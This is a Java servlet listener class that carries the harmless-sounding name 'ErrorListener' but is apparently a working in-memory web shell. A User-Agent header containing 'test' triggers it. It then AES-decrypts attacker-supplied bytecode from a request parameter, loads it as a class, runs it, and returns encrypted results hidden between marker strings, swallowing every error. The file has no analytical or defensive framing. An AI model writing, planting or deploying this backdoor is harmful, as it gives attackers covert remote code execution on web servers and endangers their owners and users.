import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;

public class ErrorListener extends ClassLoader implements ServletRequestListener {
    public String md5 = "4B9B4A9EEB3F82A06A5D643C57E87B54";
    public String pass = "passListener";
    public String key = "4fe60e3b9193d6bd";
    public String headerName = "User-Agent";
    public String headerValue = "test";

    public ErrorListener() {
    }

    public ErrorListener(ClassLoader var1) {
        super(var1);
    }

    public static synchronized Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) {
        byte[] value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(this.key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var41) {
            return null;
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpServletResponse response = this.getResponseFromRequest(request);
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(this.pass));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new ErrorFilter(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(this.md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(this.md5.substring(16));
                    response.flushBuffer();
                }
            }
        } catch (Exception var8) {
        }

    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
        HttpServletResponse response = null;

        try {
            response = (HttpServletResponse) getFieldValue(getFieldValue(request, "request"), "response");
        } catch (Exception var4) {
            response = (HttpServletResponse) getFieldValue(request, "response");
        }

        return response;
    }
}
